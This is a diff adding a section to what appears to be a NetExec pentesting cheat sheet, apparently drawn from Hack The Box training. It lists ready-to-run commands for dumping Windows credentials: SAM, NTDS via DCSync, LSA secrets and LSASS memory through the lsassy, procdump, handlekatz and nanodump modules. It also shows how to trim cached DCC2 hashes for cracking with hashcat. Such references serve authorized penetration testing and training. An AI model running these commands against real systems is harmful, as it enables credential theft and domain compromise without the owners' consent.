@@ -398,6 +398,51 @@ python3 -m http.server 80
 # Example
 nxc ssh [$IP] -u [user] --key-file [key file] -p "" -x whoami
 ```
+### Finding Secrets and Using them
+#### SAM (Security Accounts Manager)
+* Dumping the SAM
+```bash
+nxc smb [$IP] -u [user] -p [password] --sam
+```
+#### NTDS
+> Requires DCSync privileges.  
+```bash
+nxc smb [$IP] -u [user] -p [password] --ntds
+```
+> Optionally, specifying `--user` to specify a user, and `--enabled` to dump only enabled users.  
+
+#### LSA
+```bash
+nxc smb [$IP] -u [user] -p [password] --lsa
+```
+> `$DCC2$ are domain cached credentials. DCC cannot be used for PTH. For cracking, grab the part after `$DCC2$`, and use hashcat module 2100.  
+```bash
+# Example
+INLANEFREIGHT.HTB/julio:$DCC2$10240#julio#c2139497f24725b345aa1e23352481f3
+
+# Becomes
+$DCC2$10240#julio#c2139497f24725b345aa1e23352481f3
+
+# Use Cut to fix up a list of hashes
+cat /home/plaintext/.cme/logs/MS01_10.129.204.133_2022-11-08_093944.cached| cut -d ":" -f 2
+```
+#### LSASS
+* Lsassy Module
+```bash
+nxc smb [$IP] -u [user] -p [pass] -M lsassy
+```
+* Procdump Module
+```bash
+nxc smb [$IP] -u [user] -p [pass] -M procdump
+```
+* handlekatz (Uses cloned handles to create an obfuscated memory dump)
+```bash
+nxc smb [$IP] -u [user] -p [pass] -M handlekatz
+```
+* Nanodump (Hijacks a handle for creating the minidump)
+```bash
+nxc smb [$IP] -u [user] -p [pass] -M nanodump
+```
 
 ## Remote Shell
 
